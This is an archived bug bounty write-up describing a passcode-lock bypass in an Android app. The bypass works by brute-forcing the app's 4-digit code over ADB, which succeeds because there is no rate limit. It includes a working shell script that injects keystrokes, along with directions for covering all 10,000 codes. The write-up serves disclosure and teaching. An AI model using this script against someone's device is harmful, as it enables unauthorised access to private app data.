---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-02-22_write-up-android-application-screen-lock-bypass-via-adb-brute-forcing.md
original_filename: 2022-02-22_write-up-android-application-screen-lock-bypass-via-adb-brute-forcing.md
title: Write Up – Android Application Screen Lock Bypass Via ADB Brute Forcing
category: documents
detected_topics:
- rate-limit
- oauth
- command-injection
- mobile-security
- supply-chain
tags:
- imported
- documents
- rate-limit
- oauth
- command-injection
- mobile-security
- supply-chain
language: en
raw_sha256: 27fad7b7cfd683f7861bcac65497c6b190196371d6db1350a4e4977ed5752ae2
text_sha256: f1039da11c4bf3e4cf4d0b234de94c164863a9e08cb1d7c405820869909e26cb
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# Write Up – Android Application Screen Lock Bypass Via ADB Brute Forcing

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-02-22_write-up-android-application-screen-lock-bypass-via-adb-brute-forcing.md
- Source Type: markdown
- Detected Topics: rate-limit, oauth, command-injection, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `27fad7b7cfd683f7861bcac65497c6b190196371d6db1350a4e4977ed5752ae2`
- Text SHA256: `f1039da11c4bf3e4cf4d0b234de94c164863a9e08cb1d7c405820869909e26cb`


## Content

---
title: "Write Up – Android Application Screen Lock Bypass Via ADB Brute Forcing"
page_title: "ANDROID APPLICATION SCREEN LOCK BYPASS VIA ADB BRUTE FORCING – @omespino"
url: "https://omespino.com/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/"
final_url: "https://omespino.com/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/"
authors: ["Omar Espino (@omespino)"]
bugs: ["Android", "Bruteforce", "Authentication bypass"]
publication_date: "2022-02-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2876
---

MOBILEN/A[February 2022](/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/)

# ANDROID APPLICATION SCREEN LOCK BYPASS VIA ADB BRUTE FORCING

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about how to simulate android keystrokes virtually in order to perform a brute-forcing attack with adb tools 

**Report Summary** Hi REDACTED team, I was able to find a way to bypass the screen lock in your REDACTED Android application. I was able to bypass the passcode because there is no rate limit, so since it is a 4 digit passcode, anyone can try any combination between 0000 and 9999.

**Proof of concept** 1.- Get the latest REDACTED Android application (X.X.X version) from Google Playstore. 2.- Open the android application, login with your credentials, then navigate to:  

  
  
  menu > settings > **lockscreen** and set the passcode (in my case I set 5555 as passcode)

3.- Then connect your phone via USB, make sure that you have USB debugging mode in your phone, and test the connection with the following command
  
  
  omespino@h0st:~# adb devices
  List of devices attached
  e16bc6a3	device
  

3.- After that run the **brute_passcode.sh** script (attached) and just wait
  
  
  #!/usr/bin/env bash
  package_name="com.app.pornhub"
  adb shell am force-stop $package_name > /dev/null 2>&1
  adb shell monkey -p $package_name -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
  clear
  echo
  echo "---- BRUTE FORCING SCRIPT STARTED ----"
  echo "launching pornhub application ... DONE"
  # the user passcode is 5555, in this example just try 10 passcodes for the POC
  # for the full brute force just change {5550..5560} to {0000..9999}
  for i in {5550..5560}; do
  printf "trying passcode %d \r" "$i"
  for (( j=0; j<${#i}; j++ )); do
  adb shell input keyevent $((`echo ${i:$j:1}`+7))
  done
  done
  echo
  echo "bypass successfully"

PS. You can change the passcode range from {5550..5560} to {0000..9999}, I've tried with all combinations and it worked successfully because there is no limit rate-limited on passcode tries. Number event codes list ([Stack overflow reference](https://stackoverflow.com/a/8483797)):
  
  
  ...
  7 -->  "KEYCODE_0" 
  8 -->  "KEYCODE_1" 
  9 -->  "KEYCODE_2" 
  10 -->  "KEYCODE_3" 
  11 -->  "KEYCODE_4" 
  12 -->  "KEYCODE_5" 
  13 -->  "KEYCODE_6" 
  14 -->  "KEYCODE_7" 
  15 -->  "KEYCODE_8" 
  16 -->  "KEYCODE_9" 
  ...

**Environment and tools** \- adb Android Debug Bridge version 1.0.39  
\- my own Android device

**Impact** An attacker can bypass REDACTED's android application lockscreen. Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.[](https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&display=popup&ref=plugin&src=share_button)

[](/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/)

[](/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/)
